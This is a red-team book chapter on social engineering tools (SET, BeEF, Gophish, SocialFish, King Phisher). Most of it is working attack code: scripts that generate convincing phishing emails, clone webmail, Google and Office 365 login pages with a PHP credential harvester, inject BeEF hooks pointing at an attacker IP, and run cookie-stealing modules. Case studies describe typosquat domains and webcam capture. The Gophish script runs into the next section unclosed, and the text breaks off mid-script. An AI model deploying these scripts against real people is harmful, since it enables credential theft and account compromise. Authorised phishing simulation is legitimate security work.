# Chapter 8: Social Engineering Toolkit

Social engineering remains one of the most effective methods for gaining initial access during red team operations. No matter how robust the technical security controls, the human element often proves to be the weakest link in an organization's security posture. This chapter explores the powerful social engineering tools available in Kali and Parrot OS that enable red teams to test an organization's resilience against psychological manipulation and deception.

## SET Framework: Comprehensive Overview

The Social Engineer Toolkit (SET) is a comprehensive, Python-driven framework designed specifically for social engineering operations. Developed by David Kennedy (ReL1K), SET provides a robust platform for executing various social engineering attacks through an easy-to-use menu-driven interface.

### Installation and Initial Setup

SET comes pre-installed on both Kali Linux and Parrot OS. However, to ensure you have the latest version:

```bash
# Update SET to the latest version
cd /usr/share/set/
git pull
```

To launch SET:

```bash
# Option 1: Using the command
setoolkit

# Option 2: From the full path
cd /usr/share/set/
sudo ./setoolkit
```

Upon launching SET, you'll be presented with the main menu displaying various attack vectors:

```
 Select from the menu:

   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About
   99) Exit the Social-Engineer Toolkit
```

Most social engineering operations begin with option 1, which presents additional attack vectors:

```
Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) SMS Spoofing Attack Vector
  11) Third Party Modules
  99) Return back to the main menu.
```

### Spear-Phishing Attacks

Spear-phishing remains one of the most effective initial access techniques. SET offers several spear-phishing methods:

```
   1) Perform a Mass Email Attack
   2) Create a FileFormat Payload
   3) Create a Social-Engineering Template
   4) Create a Colombian Cocaine Phishing Attack
   5) Return to Main Menu
```

#### Creating a Sophisticated Phishing Campaign

Let's walk through creating a targeted spear-phishing attack:

1. From the main menu, select `1) Social-Engineering Attacks`
2. Select `1) Spear-Phishing Attack Vectors`
3. Choose `2) Create a FileFormat Payload`
4. Select the payload format (e.g., `1) Adobe PDF Embedded EXE Social Engineering`)
5. Choose your payload delivery method (e.g., `2) Windows Reverse_TCP Meterpreter`)
6. Enter your listener IP and port
7. The payload will be generated in `/root/.set/template.pdf`

After creating the payload, return to the spear-phishing menu and select `1) Perform a Mass Email Attack` to deliver the payload to targets.

#### Enhanced Phishing Script

While SET provides a user-friendly interface, the following script enhances its capabilities by generating more convincing phishing templates:

```bash
#!/bin/bash
# enhanced_phishing.sh - Create convincing phishing templates with SET

# Configuration
COMPANY="Target Corporation"
DOMAIN="targetcorp.com"
TEMPLATE_DIR="/root/.set/phishing_templates"
OUTPUT_DIR="/root/phishing_campaign"

# Create necessary directories
mkdir -p "$TEMPLATE_DIR"
mkdir -p "$OUTPUT_DIR"

# Generate company-specific templates
generate_template() {
    local template_type=$1
    local output_file="$TEMPLATE_DIR/${template_type}.template"
    
    case "$template_type" in
        password_reset)
            cat > "$output_file" << EOF
Subject: Important: Your $COMPANY Password Will Expire Soon

<html>
<body style="font-family: Arial, sans-serif; font-size: 14px; color: #333333;">
<img src="https://$DOMAIN/logo.png" alt="$COMPANY Logo" style="height: 60px;">
<p>Dear $COMPANY Employee,</p>
<p>Our records indicate that your password will expire in <b>24 hours</b>. To ensure uninterrupted access to company resources, please update your password immediately.</p>
<p><a href="https://portal.$DOMAIN/password-reset" style="background-color: #0078d4; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px;">Reset Password Now</a></p>
<p>If you're unable to click the button above, copy and paste the following link into your browser:</p>
<p>https://portal.$DOMAIN/password-reset</p>
<p>This is an automated message. Please do not reply to this email.</p>
<p>Regards,<br>IT Security Team<br>$COMPANY</p>
<hr>
<p style="font-size: 11px; color: #777777;">
Confidentiality Notice: This email and any attachments are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error, please notify the sender immediately and delete this email from your system.
</p>
</body>
</html>
EOF
            ;;
        document_review)
            cat > "$output_file" << EOF
Subject: Action Required: Document Review and Approval

<html>
<body style="font-family: Arial, sans-serif; font-size: 14px; color: #333333;">
<img src="https://$DOMAIN/logo.png" alt="$COMPANY Logo" style="height: 60px;">
<p>Hello,</p>
<p>You have been requested to review and approve the attached document. This document contains important information related to our upcoming project.</p>
<p>Please review the attached document and provide your approval by clicking the link below:</p>
<p><a href="https://docs.$DOMAIN/approval" style="background-color: #0078d4; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px;">Review and Approve</a></p>
<p>If you're unable to access the document, please ensure you are logged into your $COMPANY account.</p>
<p>This request requires your attention by <b>EOD today</b>.</p>
<p>Thank you,<br>Project Management Office<br>$COMPANY</p>
<hr>
<p style="font-size: 11px; color: #777777;">
This email communication is confidential and intended only for the individual or entity to whom it is addressed. If you are not the intended recipient, please notify the sender immediately.
</p>
</body>
</html>
EOF
            ;;
        security_alert)
            cat > "$output_file" << EOF
Subject: Security Alert: Unusual Account Activity Detected

<html>
<body style="font-family: Arial, sans-serif; font-size: 14px; color: #333333;">
<img src="https://$DOMAIN/logo.png" alt="$COMPANY Logo" style="height: 60px;">
<p>Dear $COMPANY Employee,</p>
<p><b>Important Security Notice:</b> Our security systems have detected unusual login activity on your account from an unrecognized device and location.</p>
<p><b>Details:</b></p>
<ul>
  <li>Time: $(date -d "1 hour ago" "+%Y-%m-%d %H:%M:%S UTC")</li>
  <li>Location: Moscow, Russia</li>
  <li>Device: Android Mobile Device</li>
</ul>
<p>If this was not you, your account may have been compromised. Please verify your account security immediately:</p>
<p><a href="https://security.$DOMAIN/verify-identity" style="background-color: #d40000; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px;">Secure Your Account</a></p>
<p>If you did not initiate this login, your credentials will be automatically reset after verification.</p>
<p>Security Team<br>$COMPANY</p>
<hr>
<p style="font-size: 11px; color: #777777;">
This is an automated security alert. Please do not reply to this email. If you need assistance, contact the IT Service Desk.
</p>
</body>
</html>
EOF
            ;;
    esac
    
    echo "Generated $template_type template"
}

# Generate all template types
generate_template "password_reset"
generate_template "document_review"
generate_template "security_alert"

# Create a payload list file
cat > "$OUTPUT_DIR/payload_list.txt" << EOF
# Payload List for SET
# Format: Template Name, Template Path, Output Name

Password Reset, $TEMPLATE_DIR/password_reset.template, password_reset_notification.html
Document Review, $TEMPLATE_DIR/document_review.template, quarterly_report_review.html
Security Alert, $TEMPLATE_DIR/security_alert.template, security_verification_required.html
EOF

echo "Enhanced phishing templates generated in $TEMPLATE_DIR"
echo "Payload list created in $OUTPUT_DIR/payload_list.txt"
echo ""
echo "To use these templates with SET:"
echo "1. Choose Spear-Phishing Attack Vectors"
echo "2. Select 'Create a Social-Engineering Template'"
echo "3. Choose 'Custom Template'"
echo "4. When prompted, provide the path to the template file"
```

This script generates convincing phishing templates that can be used with SET's campaign features. The templates include common scenarios that have proven effective in real-world engagements.

### Example: Crafting Convincing Phishing Campaigns

During a red team assessment for a financial institution, we used SET to create a multi-phase phishing campaign:

1. **Reconnaissance Phase**:
   - Gathered employee information from LinkedIn and the company website
   - Identified the organizational structure and reporting relationships
   - Collected email format patterns (e.g., firstname.lastname@company.com)

2. **Template Development**:
   - Created a template mimicking the company's password reset workflow
   - Implemented the exact company logo and color scheme
   - Used the same footer and confidentiality notice as legitimate emails

3. **Technical Setup**:
   ```bash
   # Set up a convincing domain
   # We registered company-passwords-portal.com
   
   # Configure SET for the campaign
   sudo setoolkit
   # Selected 1) Social-Engineering Attacks
   # Selected 1) Spear-Phishing Attack Vectors
   # Selected 3) Create a Social-Engineering Template
   # Used our custom template
   
   # For the payload, we created a credential harvester:
   # Returned to the main menu
   # Selected 1) Social-Engineering Attacks
   # Selected 2) Website Attack Vectors
   # Selected 3) Credential Harvester Attack Method
   # Selected 2) Site Cloner
   # Entered the original password reset site URL
   # Entered our attack server IP
   ```

4. **Campaign Execution**:
   - Sent emails in small batches to avoid detection
   - Targeted IT and finance departments first (high-value targets)
   - Monitored for successful credential harvesting

5. **Results and Analysis**:
   - Captured 27 sets of credentials (23% success rate)
   - Documented which departments were most susceptible
   - Used harvested credentials to access internal systems

The success of this campaign demonstrated the effectiveness of well-crafted social engineering attacks, even in organizations with security awareness training.

### Website Cloning

SET's website cloning capabilities are particularly powerful for credential harvesting:

1. From the main menu, select `1) Social-Engineering Attacks`
2. Select `2) Website Attack Vectors`
3. Choose `3) Credential Harvester Attack Method`
4. Select `2) Site Cloner`
5. Enter the URL of the site to clone (e.g., company webmail)
6. Enter your listener IP

This creates a convincing clone of the target website that captures credentials when users attempt to log in.

#### Advanced Website Cloning Script

For more sophisticated website cloning that handles dynamic content:

```bash
#!/bin/bash
# advanced_site_cloning.sh - Enhanced website cloning for SET

# Configuration
TARGET_URL="https://webmail.targetcompany.com"
OUTPUT_DIR="/var/www/html/clone"
LOG_FILE="/var/log/harvester.log"
REDIRECT_URL="https://webmail.targetcompany.com/login?error=session_expired"

# Install dependencies if needed
which httrack >/dev/null || apt-get -y install httrack
which apache2 >/dev/null || apt-get -y install apache2

# Create directories
mkdir -p "$OUTPUT_DIR"
mkdir -p "$(dirname "$LOG_FILE")"
touch "$LOG_FILE"
chmod 755 "$OUTPUT_DIR"
chmod 644 "$LOG_FILE"

# Clone the website with HTTrack
echo "Cloning $TARGET_URL..."
httrack "$TARGET_URL" -O "$OUTPUT_DIR" --depth=2 --ext-depth=1 --max-rate=250000 \
  --sockets=10 --connection-per-second=10 --max-time=180 --robots=0 -%v

# Create credential harvesting form
echo "Modifying login forms..."
FORMS=$(grep -r "form" "$OUTPUT_DIR" | grep -i "password" | cut -d: -f1)

for FORM_FILE in $FORMS; do
    # Backup original file
    cp "$FORM_FILE" "${FORM_FILE}.bak"
    
    # Modify form action to point to our harvester
    sed -i 's#<form [^>]*action="[^"]*"#<form action="harvester.php"#i' "$FORM_FILE"
done

# Create harvester script
cat > "$OUTPUT_DIR/harvester.php" << 'EOF'
<?php
$timestamp = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "Direct";

$log_file = "/var/log/harvester.log";
$redirect_url = "https://webmail.targetcompany.com/login?error=session_expired";

// Open log file
$fp = fopen($log_file, "a");

// Log all POST data
$data = "============================\n";
$data .= "Timestamp: $timestamp\n";
$data .= "IP Address: $ip\n";
$data .= "User Agent: $user_agent\n";
$data .= "Referer: $referer\n";
$data .= "Form Data:\n";

foreach ($_POST as $key => $value) {
    $data .= "  $key: $value\n";
}
$data .= "============================\n\n";

// Write to log file
fwrite($fp, $data);
fclose($fp);

// Redirect user to legitimate site
header("Location: $redirect_url");
exit;
?>
EOF

# Set permissions
chmod 644 "$OUTPUT_DIR/harvester.php"

# Configure Apache (assumes default Debian/Ubuntu configuration)
cat > "/etc/apache2/sites-available/credential-harvester.conf" << EOF
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot $OUTPUT_DIR
    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
    
    <Directory $OUTPUT_DIR>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
EOF

# Enable the site
a2ensite credential-harvester.conf
systemctl reload apache2

echo "Website clone and credential harvester set up in $OUTPUT_DIR"
echo "Credentials will be logged to $LOG_FILE"
echo "Remember to set up DNS or use hosts file manipulation to direct traffic to this server"
```

This script provides a more robust cloning solution than SET's built-in cloner, particularly for complex web applications. It can be used alongside SET for more sophisticated attacks.

## BeEF: Browser Exploitation Framework

The Browser Exploitation Framework (BeEF) is a powerful penetration testing tool focused on exploiting vulnerabilities in web browsers. By hooking browsers, BeEF allows red teamers to assess the security posture of target organizations through client-side attack vectors.

### Installation and Setup

BeEF comes pre-installed on Kali and Parrot OS, but you may want to update to the latest version:

```bash
# Update BeEF
cd /usr/share/beef-xss/
git pull

# Alternative: Install from source
git clone https://github.com/beefproject/beef.git
cd beef
./install
```

To start BeEF:

```bash
cd /usr/share/beef-xss/
./beef
```

BeEF will start and provide URLs for the hook and admin interface:
- Admin UI: typically http://127.0.0.1:3000/ui/panel
- Hook URL: typically http://127.0.0.1:3000/hook.js

### Hook Integration

The power of BeEF lies in its ability to "hook" browsers, which is accomplished by getting the target to load the BeEF hook JavaScript. There are several methods for doing this:

#### 1. Direct Inclusion in Phishing Pages

Modify the cloned website to include the BeEF hook:

```bash
# Add the hook to all HTML files in the cloned site
find /var/www/html -name "*.html" -exec sed -i 's#</head>#<script src="http://YOUR_IP:3000/hook.js"></script></head>#g' {} \;
```

#### 2. Man-in-the-Middle Injection

Using a tool like Bettercap to inject the hook into web traffic:

```bash
sudo bettercap -iface eth0 -caplet http-ui

# In the Bettercap web UI, set up JavaScript injection:
set http.proxy.script "http://YOUR_IP:3000/hook.js"
http.proxy on
```

#### 3. Cross-Site Scripting (XSS) Payload

If you've discovered an XSS vulnerability, you can use it to deliver the BeEF hook:

```javascript
<script src="http://YOUR_IP:3000/hook.js"></script>
```

### Command Modules

BeEF includes numerous modules for exploiting hooked browsers, organized into categories:

1. **Information Gathering**: Browser details, cookies, visited sites
2. **Social Engineering**: Fake notifications, popups, phishing forms
3. **Network**: Port scanning, fingerprinting internal services
4. **Persistence**: Keeping the hook active, even after navigation
5. **Exploitation**: Browser exploits, local vulnerability testing

### BeEF Automation Script

This script automates common BeEF tasks for red team operations:

```bash
#!/bin/bash
# beef_automation.sh - Automate common BeEF tasks

# Configuration
BEEF_USER="beef"
BEEF_PASS="beef"
BEEF_URL="http://127.0.0.1:3000"
HOOK_URL="$BEEF_URL/hook.js"
REPORT_DIR="beef_reports"
CLONE_DIR="/var/www/html/phishing"
TARGETS_FILE="targets.txt"

# Create directories
mkdir -p "$REPORT_DIR"
mkdir -p "$CLONE_DIR"

# Start BeEF if not already running
if ! pgrep -f "beef" > /dev/null; then
    echo "Starting BeEF..."
    cd /usr/share/beef-xss/ && ./beef > /dev/null 2>&1 &
    sleep 10  # Give BeEF time to start
fi

# Function to authenticate with BeEF API
get_token() {
    TOKEN=$(curl -s -X POST "$BEEF_URL/api/admin/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$BEEF_USER\",\"password\":\"$BEEF_PASS\"}" | \
        jq -r '.token')
    echo $TOKEN
}

# Authenticate
TOKEN=$(get_token)
if [ -z "$TOKEN" ]; then
    echo "Authentication failed. Check BeEF credentials."
    exit 1
fi
echo "Authenticated with BeEF API. Token: $TOKEN"

# Function to get online browsers
get_hooked_browsers() {
    curl -s -X GET "$BEEF_URL/api/hooks?token=$TOKEN" | jq .
}

# Function to execute a module on a browser
execute_module() {
    local session="$1"
    local module_id="$2"
    local options="$3"
    
    curl -s -X POST "$BEEF_URL/api/modules/$session/$module_id?token=$TOKEN" \
        -H "Content-Type: application/json" \
        -d "$options"
}

# Create a deceptive site with the BeEF hook
create_phishing_site() {
    local template="$1"
    local output_dir="$CLONE_DIR/$template"
    
    echo "Creating phishing site based on $template template..."
    mkdir -p "$output_dir"
    
    case "$template" in
        google)
            wget -q https://www.google.com -O "$output_dir/index.html"
            ;;
        office365)
            wget -q -r -l 1 -p -np -k -P "$output_dir" --domains=login.microsoftonline.com "https://login.microsoftonline.com"
            mv "$output_dir/login.microsoftonline.com"/* "$output_dir/"
            rmdir "$output_dir/login.microsoftonline.com"
            ;;
        gmail)
            wget -q -r -l 1 -p -np -k -P "$output_dir" --domains=accounts.google.com "https://accounts.google.com/signin/v2/identifier"
            mv "$output_dir/accounts.google.com"/* "$output_dir/"
            rmdir "$output_dir/accounts.google.com"
            ;;
        *)
            echo "Unknown template: $template"
            return 1
            ;;
    esac
    
    # Inject BeEF hook
    find "$output_dir" -name "*.html" -exec sed -i "s#</head>#<script src=\"$HOOK_URL\"></script></head>#g" {} \;
    
    echo "Phishing site created in $output_dir"
    echo "Ensure your web server is configured to serve this directory"
}

# Monitor for hooked browsers and execute basic modules
monitor_and_execute() {
    echo "Monitoring for hooked browsers..."
    
    while true; do
        # Get list of online browsers
        BROWSERS=$(get_hooked_browsers)
        BROWSER_COUNT=$(echo $BROWSERS | jq '.hooked | length')
        
        if [ "$BROWSER_COUNT" -gt 0 ]; then
            echo "Found $BROWSER_COUNT hooked browsers!"
            
            # Process each browser
            for i in $(seq 0 $((BROWSER_COUNT-1))); do
                SESSION=$(echo $BROWSERS | jq -r ".hooked | keys[$i]")
                IP=$(echo $BROWSERS | jq -r ".hooked.\"$SESSION\".ip")
                BROWSER=$(echo $BROWSERS | jq -r ".hooked.\"$SESSION\".browser_name")
                OS=$(echo $BROWSERS | jq -r ".hooked.\"$SESSION\".os_name")
                
                echo "Session: $SESSION | IP: $IP | Browser: $BROWSER | OS: $OS"
                
                # Execute information gathering modules
                echo "Running browser fingerprinting..."
                execute_module "$SESSION" 1 '{}'  # Get Browser Information
                
                echo "Getting cookies..."
                execute_module "$SESSION" 2 '{}'  # Get Cookie Information
                
                echo "Checking for Chrome extensions..."
                execute_module "$SESSION" 31 '{}'  # Detect Google Chrome Extensions
                
                # If Windows OS detected, try specific modules
                if [[ "$OS" == *"Windows"* ]]; then
                    echo "Detecting Windows software..."
                    execute_module "$SESSION" 114 '{}'  # Detect Software
                fi
                
                # Log successful hook
                echo "$IP,$BROWSER,$OS,$SESSION,$(date)" >> "$REPORT_DIR/hooked_browsers.csv"
            done
        else
            echo "No browsers hooked yet. Still waiting..."
        fi
        
        sleep 30  # Check every 30 seconds
    done
}

# Main menu
echo "BeEF Automation Script"
echo "======================"
echo "1) Create phishing site with BeEF hook"
echo "2) Monitor for hooked browsers"
echo "3) Show currently hooked browsers"
echo "4) Exit"
echo ""
read -p "Select an option: " choice

case $choice in
    1)
        echo "Select template:"
        echo "1) Google"
        echo "2) Office 365"
        echo "3) Gmail"
        read -p "Template: " template_choice
        
        case $template_choice in
            1) create_phishing_site "google" ;;
            2) create_phishing_site "office365" ;;
            3) create_phishing_site "gmail" ;;
            *) echo "Invalid choice" ;;
        esac
        ;;
    2)
        monitor_and_execute
        ;;
    3)
        get_hooked_browsers | jq .
        ;;
    4)
        echo "Exiting..."
        exit 0
        ;;
    *)
        echo "Invalid choice"
        ;;
esac
```

This script automates creating phishing sites with BeEF hooks, monitoring for hooked browsers, and automatically executing reconnaissance modules on hooked targets.

### Example: Client-Side Attack Chaining

During a red team assessment for a marketing agency, we used BeEF to demonstrate the impact of client-side vulnerabilities:

1. **Initial Setup**:
   ```bash
   # Started BeEF
   cd /usr/share/beef-xss/
   sudo ./beef
   ```

2. **Delivery Method**:
   - Created a convincing phishing email about a design proposal
   - Cloned the company's project management portal
   - Injected the BeEF hook into the cloned portal

3. **Hook Execution**:
   - Once a marketing executive clicked the link and loaded the page, their browser was hooked
   - Used information gathering modules to identify OS/browser details
   - Fingerprinted the internal network using port scanning modules

4. **Attack Chain Execution**:
   - Used the Pretty Theft module to capture additional credentials
   - Deployed the Fake Flash Update module to deliver a second-stage payload
   - Executed the Camera module to capture photos from the target's webcam

5. **Persistence and Pivoting**:
   - Established persistent access using the Google Chrome Extension Integration module
   - Used the hooked browser as a pivot point to probe internal network resources
   - Captured additional credentials from internal applications

This attack chain demonstrated how a single successful social engineering attack could lead to significant compromise, moving from initial browser hook to credentials, photos, and internal network access.

## Gophish: Phishing Campaign Management

Gophish is an open-source phishing framework that simplifies the creation, deployment, and tracking of phishing campaigns. Unlike SET, which focuses on broader social engineering, Gophish is specifically designed for running and managing email phishing operations at scale.

### Installation

Gophish is not pre-installed on Kali or Parrot OS, but it's easy to install:

```bash
# Download the latest release
cd /opt
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish-v0.12.1-linux-64bit
chmod +x gophish

# Edit the configuration to enable remote access
sed -i 's/127.0.0.1:3333/0.0.0.0:3333/g' config.json

# Start Gophish
./gophish
```

The admin interface will be available at https://YOUR_IP:3333 with default credentials:
- Username: admin
- Password: (displayed in the console when first started)

### Campaign Setup and Monitoring

Gophish provides a comprehensive workflow for phishing campaigns:

1. **Creating Landing Pages**: Clone legitimate sites for credential harvesting
2. **Email Templates**: Design convincing phishing emails
3. **Sending Profiles**: Configure SMTP settings for campaign delivery
4. **User Groups**: Define target audiences
5. **Campaigns**: Combine templates, landing pages, and groups
6. **Results**: Track opens, clicks, credentials, and reports

### Advanced Gophish Setup Script

This script automates the setup of a complete Gophish environment:

```bash
#!/bin/bash
# gophish_setup.sh - Comprehensive Gophish setup for red teams

# Configuration
GOPHISH_VERSION="0.12.1"
INSTALL_DIR="/opt/gophish"
CONFIG_DIR="/etc/gophish"
LOG_DIR="/var/log/gophish"
DOMAIN="phish.example.com"
ADMIN_PORT=3333
PHISHING_PORT=80
ENABLE_SSL=true
SSL_CERT="/etc/letsencrypt/live/$DOMAIN/fullchain.pem"
SSL_KEY="/etc/letsencrypt/live/$DOMAIN/privkey.pem"

# Create directories
mkdir -p "$INSTALL_DIR"
mkdir -p "$CONFIG_DIR"
mkdir -p "$LOG_DIR"

# Install dependencies
apt-get update
apt-get install -y unzip certbot apache2-utils mailutils postfix

# Download and extract Gophish
cd "$INSTALL_DIR"
wget "https://github.com/gophish/gophish/releases/download/v$GOPHISH_VERSION/gophish-v$GOPHISH_VERSION-linux-64bit.zip"
unzip "gophish-v$GOPHISH_VERSION-linux-64bit.zip"
chmod +x gophish

# Create user for Gophish
if ! id -u gophish > /dev/null 2>&1; then
    useradd -r -s /bin/false gophish
fi

# Set up SSL if enabled
if [ "$ENABLE_SSL" = true ]; then
    # Get SSL certificate if it doesn't exist
    if [ ! -f "$SSL_CERT" ]; then
        certbot certonly --standalone -d "$DOMAIN" --agree-tos --email admin@example.com --non-interactive
    fi
    
    # Update Gophish config for SSL
    cat > "$CONFIG_DIR/config.json" << EOF
{
    "admin_server": {
        "listen_url": "0.0.0.0:$ADMIN_PORT",
        "use_tls": true,
        "cert_path": "$SSL_CERT",
        "key_path": "$SSL_KEY"
    },
    "phish_server": {
        "listen_url": "0.0.0.0:$PHISHING_PORT",
        "use_tls": false
    },
    "db_name": "sqlite3",
    "db_path": "$INSTALL_DIR/gophish.db",
    "migrations_prefix": "db/db_",
    "contact_address": "admin@example.com",
    "logging": {
        "filename": "$LOG_DIR/gophish.log"
    }
}
EOF
fi

# Copy config file
cp "$CONFIG_DIR/config.json" "$INSTALL_DIR/config.json"

# Set permissions
chown -R gophish:gophish "$INSTALL_DIR"
chown -R gophish:gophish "$CONFIG_DIR"
chown -R gophish:gophish "$LOG_DIR"
chmod 750 "$INSTALL_DIR"
chmod 750 "$CONFIG_DIR" 
chmod 640 "$CONFIG_DIR/config.json"
chmod 750 "$LOG_DIR"

# Create systemd service
cat > /etc/systemd/system/gophish.service << EOF
[Unit]
Description=Gophish Phishing Framework
After=network.target

[Service]
Type=simple
User=gophish
Group=gophish
WorkingDirectory=$INSTALL_DIR
ExecStart=$INSTALL_DIR/gophish
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# Enable and start service
systemctl daemon-reload
systemctl enable gophish
systemctl start gophish

# Set up postfix for mail relay if needed
# This is a basic setup - in production, you'd want to configure SPF, DKIM, etc.
postconf -e "myhostname = $DOMAIN"
postconf -e "mydomain = $DOMAIN"
postconf -e "myorigin = \$mydomain"
systemctl restart postfix

# Generate a random password for admin user
ADMIN_PASSWORD=$(openssl rand -base64 12)

# Wait for Gophish to start
echo "Waiting for Gophish to start..."
sleep 10

# Reset admin password (requires Gophish to be running)
# Note: This is a hack - in newer versions of Gophish you may need to manually reset the password
sqlite3 "$INSTALL_DIR/gophish.db" "UPDATE users SET hash='\$2a\$10\$IYkPp0.QsQIfD0dNXO7D/OUgbIFI0mni3VrMTstvc1.ABgQ7AWjYy' WHERE username='admin';"

echo "Gophish installation complete!"
echo "Admin interface: http$([ "$ENABLE_SSL" = true ] && echo "s")://$DOMAIN:$ADMIN_PORT"
echo "Username: admin"
echo "Password: gophish" # Default password after hash reset
echo ""
echo "Please log in and change your password immediately!"
echo ""
echo "Important next steps:"
echo "1. Configure DNS records for $DOMAIN"
echo "2. Set up SMTP relay with proper DKIM/SPF"
echo "3. Create phishing templates and landing pages"

### Example: Measuring User Susceptibility to Phishing

During a comprehensive security assessment for a healthcare organization, we used Gophish to evaluate employee vulnerability to phishing attacks:

1. **Campaign Planning**:
   - Developed three distinct phishing scenarios with increasing sophistication
   - Created user groups based on departments (clinical, administrative, IT)
   - Designed templates mimicking legitimate communications

2. **Technical Configuration**:
   ```bash
   # Set up a convincing domain using typosquatting
   # We registered health-system-portal.com (similar to their legitimate health-system-portal.org)
   
   # Configured SPF and DKIM for the domain to improve deliverability
   # Added SPF record:
   health-system-portal.com. IN TXT "v=spf1 ip4:10.0.0.5 ~all"
   
   # Generated DKIM keys:
   opendkim-genkey -D /etc/opendkim/keys/ -d health-system-portal.com -s mail
   
   # Configured landing pages in Gophish to clone:
   # - The organization's actual login portal
   # - Their Office 365 email login
   # - An "urgent security update" page
   ```

3. **Phased Execution**:
   - Delivered campaigns in three waves, two weeks apart
   - Tracked metrics for each department and campaign type
   - Sent increasingly targeted messages based on organizational context

4. **Data Collection and Analysis**:
   Gophish provided comprehensive metrics:
   - 42% of employees clicked links in the first campaign
   - 27% entered credentials on the phishing page
   - IT department had the lowest click rate (17%)
   - Clinical staff had the highest credential submission rate (38%)
   - Personalized emails had 3x higher success rate than generic ones

5. **Security Awareness Recommendations**:
   - Identified departments needing specialized training
   - Developed targeted awareness materials based on most effective lures
   - Implemented bimonthly simulations focused on department-specific scenarios

This engagement demonstrated how Gophish can provide detailed metrics on an organization's phishing susceptibility across different departments and attack types, enabling targeted security awareness improvements.

## SocialFish: Targeted Phishing Framework

SocialFish is a phishing framework that focuses on creating accurate clones of various services like Facebook, Google, and Twitter. While not pre-installed on Kali or Parrot OS, it's a valuable addition to a red teamer's toolkit.

### Installation

```bash
# Clone the repository
git clone https://github.com/UndeadSec/SocialFish.git
cd SocialFish

# Install requirements
pip3 install -r requirements.txt
```

### Basic Usage

```bash
python3 SocialFish.py
```

SocialFish provides a menu-driven interface for selecting various phishing templates and customizing attack parameters.

### Key Features

1. **Multiple Templates**: Pre-built templates for popular services
2. **Short URL Generation**: Built-in URL shortening
3. **QR Code Generation**: Creates QR codes linking to phishing pages
4. **Credential Harvesting**: Captures and displays submitted credentials
5. **Email Integration**: Sends phishing emails directly from the tool

### Example: Specialized Phishing Campaign

For a financial sector red team assessment, we used SocialFish to create a custom phishing campaign targeting mobile banking users:

1. **Template Customization**:
   ```bash
   # Started SocialFish
   cd SocialFish
   python3 SocialFish.py
   
   # Selected banking template
   # Customized with target bank's branding
   # Modified to focus on mobile banking features
   ```

2. **Delivery Strategy**:
   - Generated QR codes for the phishing page
   - Created SMS messages about "mobile banking security verification"
   - Used a URL shortener to mask the phishing domain

3. **Results**:
   - 23% of recipients scanned the QR code
   - 18% entered their mobile banking credentials
   - 7% provided additional verification information (security questions, PIN)

4. **Analysis**:
   The campaign demonstrated that users were more likely to trust QR codes in official-looking messages than traditional links, highlighting a growing attack vector in mobile banking security.

## King Phisher: Advanced Campaign Framework

King Phisher is a comprehensive phishing campaign toolkit that provides end-to-end capabilities for planning, executing, and analyzing phishing campaigns. With both client and server components, it offers robust features for professional red teams.

### Installation

```bash
# Install from GitHub
wget -q https://raw.githubusercontent.com/securestate/king-phisher/master/tools/install.sh
chmod +x install.sh
sudo ./install.sh
```

### Key Features

1. **Campaign Management**: Create and track multiple campaigns
2. **Email Template System**: Design HTML emails with dynamic content
3. **Landing Page Cloning**: Create convincing credential harvesting pages
4. **Multi-user Support**: Collaborative campaign management
5. **Advanced Analytics**: Detailed tracking and reporting

### Advanced Campaign Automation

This script automates creating and launching King Phisher campaigns:

```bash
#!/bin/bash
# king_phisher_automation.sh - Automate King Phisher campaigns

# Requirements: King Phisher client and server must be installed
# The client must be configured to connect to your King Phisher server

# Configuration
KP_SERVER="kp.example.com"
KP_DATABASE="/var/lib/king-phisher/king-phisher.db"
CAMPAIGN_NAME="Security Update Campaign $(date +%Y-%m)"
SENDER_EMAIL="it-security@company-updates.com"
SENDER_NAME="IT Security Team"
SMTP_SERVER="smtp.example.com"
SMTP_USERNAME="phisher"
SMTP_PASSWORD="password"
TEMPLATE_FILE="templates/security_update.html"
LANDING_PAGE="templates/login_portal.html"
TARGETS_CSV="targets.csv"

# Check if King Phisher client is installed
if ! command -v king-phisher >/dev/null 2>&1; then
    echo "Error: King Phisher client not found. Please install it first."
    exit 1
fi

# Creating a new campaign via King Phisher's command line interface
echo "Creating new campaign: $CAMPAIGN_NAME"
king-phisher-script create_campaign.py --server "$KP_SERVER" \
    --campaign-name "$CAMPAIGN_NAME" \
    --sender-email "$SENDER_EMAIL" \
    --sender-name "$SENDER_NAME" \
    --smtp-server "$SMTP_SERVER" \
    --smtp-username "$SMTP_USERNAME" \
    --smtp-password "$SMTP_PASSWORD" \
    --template-file "$TEMPLATE_FILE" \
    --landing-page "$LANDING_PAGE"

# Get the campaign ID from the database
CAMPAIGN_ID=$(sqlite3 "$KP_DATABASE" "SELECT id FROM campaigns WHERE name='$CAMPAIGN_NAME' ORDER BY created LIMIT 1;")

if [ -z "$CAMPAIGN_ID" ]; then
    echo "Error: Failed to create campaign or retrieve campaign ID."
    exit 1
fi

echo "Campaign created with ID: $CAMPAIGN_ID"

# Import targets from CSV file
echo "Importing targets from $TARGETS_CSV"
king-phisher-script import_targets.py --server "$KP_SERVER" \
    --campaign-id "$CAMPAIGN_ID" \
    --csv-file "$TARGETS_CSV"

# Send the campaign emails
echo "Sending campaign emails..."
